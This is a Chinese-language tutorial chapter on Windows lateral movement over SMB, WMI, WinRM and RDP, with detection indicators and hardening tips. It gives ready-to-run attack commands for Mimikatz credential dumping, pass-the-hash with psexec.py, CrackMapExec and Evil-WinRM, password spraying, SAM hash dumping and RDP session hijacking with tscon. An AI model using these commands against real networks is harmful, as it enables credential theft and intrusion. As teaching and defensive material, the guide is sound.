# Windows 横向移动

### 5.1 SMB 横向移动

**SMB 协议概述**

SMB（Server Message Block）是 Windows 文件共享和打印共享的协议，使用端口 445（TCP）。SMB 是横向移动中最常用的协议之一。

**SMB 信息收集**

```powershell
# 探测主机的 SMB 共享
net view \\<target>
net use \\<target>\ipc$ "" /user:""  # 空会话

# 使用 PowerShell
Get-SmbShare -CimSession <target>

# 列出共享文件
dir \\<target>\share
```

**SMB 凭据传递（Pass-the-Hash）**

```
Pass-the-Hash (PtH) 是一种攻击技术，攻击者使用用户的 NTLM 哈希
而不是明文密码进行身份验证。

工具：
- Mimikatz：提取内存中的哈希
- CrackMapExec：SMB 横向移动工具
- Impacket：psexec、smbexec 等

示例（Mimikatz 提取哈希）：
privilege::debug
sekurlsa::logonpasswords

示例（psexec 横向移动）：
psexec.py administrator:password@target_ip cmd.exe
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@target_ip cmd.exe
```

**SMB 远程执行**

| 技术 | 说明 | 需要权限 |
|------|------|----------|
| PsExec | 通过服务执行命令 | 管理员权限 |
| WMI 执行 | 通过 WMI 执行命令 | 管理员权限 |
| SCM 服务执行 | 通过服务控制管理器 | 管理员权限 |
| DCOM 执行 | 通过 DCOM 执行 |  varying |
| 计划任务 | 通过计划任务执行 |  varying |

**CrackMapExec 使用示例**

```bash
# 检测 SMB 签名
crackmapexec smb 192.168.1.0/24

# 密码喷洒
crackmapexec smb 192.168.1.0/24 -u user -p 'Password123'

# 哈希传递
crackmapexec smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# 执行命令
crackmapexec smb 192.168.1.10 -u admin -p 'pass' -x 'whoami'

# 转储 SAM 哈希
crackmapexec smb 192.168.1.10 -u admin -p 'pass' --sam
```

### 5.2 WMI 横向移动

**WMI 概述**

WMI（Windows Management Instrumentation）是 Windows 的管理基础设施，提供了统一的方式来管理 Windows 系统。WMI 使用端口 135（DCOM）和动态端口（1024-65535）。

**WMI 信息收集**

```powershell
# 远程获取系统信息
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target>
Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName <target>

# 获取进程列表
Get-WmiObject -Class Win32_Process -ComputerName <target>

# 获取服务列表
Get-WmiObject -Class Win32_Service -ComputerName <target>

# 获取已安装软件
Get-WmiObject -Class Win32_Product -ComputerName <target>
```

**WMI 远程命令执行**

```powershell
# 使用 wmic 执行命令
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe /c whoami > C:\temp\out.txt"

# 使用 PowerShell
$username = "domain\user"
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName <target> -Credential $cred

# 使用 CIM
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"} -ComputerName <target> -Credential $cred
```

**WMI 横向移动检测**

```
检测 WMI 横向移动的指标：
1. 事件 ID 4688：wmic.exe 或 wmiprvse.exe 进程创建
2. 事件 ID 5140：网络共享访问（WMI 可能通过 ADMIN$ 共享）
3. 端口 135 和动态端口的异常连接
4. WMI 活动日志：Microsoft-Windows-WMI-Activity/Operational
   - 事件 ID 5857：WMI 提供程序加载
   - 事件 ID 5858：WMI 操作失败
   - 事件 ID 5859：WMI 事件消费者注册
```

### 5.3 WinRM 横向移动

**WinRM 概述**

WinRM（Windows Remote Management）是 Microsoft 实现的 WS-Management 协议，用于远程管理 Windows 系统。使用端口 5985（HTTP）和 5986（HTTPS）。

**WinRM 远程命令执行**

```powershell
# 启用 WinRM（目标端）
Enable-PSRemoting -Force

# 远程 PowerShell 会话
Enter-PSSession -ComputerName <target> -Credential <cred>

# 远程执行命令
Invoke-Command -ComputerName <target> -ScriptBlock { whoami } -Credential <cred>

# 远程执行脚本
Invoke-Command -ComputerName <target> -FilePath C:\script.ps1 -Credential <cred>

# 使用 IP 地址（需要将 IP 添加到受信任主机）
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.100" -Force
Enter-PSSession -ComputerName 192.168.1.100 -Credential <cred>
```

**WinRM 检测与防护**

```
检测指标：
1. 端口 5985/5986 的异常连接
2. PowerShell 事件日志中的远程命令执行
3. 事件 ID 4688：wsmprovhost.exe 进程创建
4. WinRM 事件日志：Microsoft-Windows-WinRM/Operational

防护措施：
1. 限制 WinRM 访问的源地址（防火墙规则）
2. 使用 HTTPS（5986）传输，启用证书认证
3. 限制具有 WinRM 访问权限的账户
4. 监控 WinRM 活动日志
5. 启用 PowerShell 模块日志和脚本块日志
```

**Evil-WinRM 使用示例**

```bash
# 使用密码连接
evil-winrm -i <target_ip> -u <username> -p <password>

# 使用哈希连接（Pass-the-Hash）
evil-winrm -i <target_ip> -u <username> -H <ntlm_hash>

# 使用 SSL 连接
evil-winrm -i <target_ip> -u <username> -p <password> -S

# 上传/下载文件
upload local_file.txt
download remote_file.txt
```

### 5.4 RDP 横向移动

**RDP 概述**

RDP（Remote Desktop Protocol）是 Windows 远程桌面协议，使用端口 3389（TCP/UDP）。RDP 是最常见的远程管理方式，也是攻击者横向移动的重要途径。

**RDP 信息收集**

```powershell
# 检测 RDP 是否启用
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections

# 检测 RDP 端口
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name PortNumber

# 检测 NLA（网络级别身份验证）
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication

# 查看 RDP 会话
qwinsta /server:<target>
query session /server:<target>
```

**RDP 攻击方法**

1. **密码喷洒/暴力破解**：使用已知用户名列表和常见密码尝试登录
2. **Pass-the-Hash**：使用 NTLM 哈希进行 RDP 认证（Restricted Admin 模式）
3. **RDP 会话劫持**：劫持已登录用户的 RDP 会话
4. **BlueKeep 漏洞**：CVE-2019-0708，RDP 远程代码执行漏洞

**RDP 会话劫持**

```powershell
# 查看当前会话
query user

# 劫持会话（需要 SYSTEM 权限）
# 连接到另一个用户的会话
tscon <session_id> /dest:<current_session_name>

# 示例：从 SYSTEM 会话切换到管理员会话
tscon 2 /dest:console
```

**RDP 防护措施**

1. 使用强密码和账户锁定策略
2. 启用网络级别身份验证（NLA）
3. 限制 RDP 访问的源地址（防火墙）
4. 更改默认 RDP 端口（安全性有限，主要减少噪音）
5. 配置 RDP 证书（TLS 加密）
6. 监控 RDP 登录事件（事件 ID 4624、4625、4634）
7. 使用 VPN 或 RD Gateway 进行远程访问
8. 启用受限管理模式（防止凭据盗窃）

---

---

